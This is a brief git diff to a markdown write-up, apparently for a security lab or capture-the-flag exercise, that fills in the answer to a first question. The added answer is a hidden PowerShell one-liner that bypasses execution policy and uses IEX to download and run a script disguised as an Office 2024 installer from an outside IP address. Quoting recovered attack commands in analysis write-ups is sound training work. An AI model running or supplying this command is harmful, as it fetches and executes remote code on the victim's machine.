@@ -21,7 +21,7 @@
 ![image](https://github.com/user-attachments/assets/8e6a4129-e597-4e74-8094-b4c111b3cf51)
 
 
-> 1ST QUESTION --> ANS:
+> 1ST QUESTION --> ANS: `powershell -NOP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"`
 
 ![image](https://github.com/user-attachments/assets/a78977c0-5c0a-48a5-8b36-473255407f4a)
 
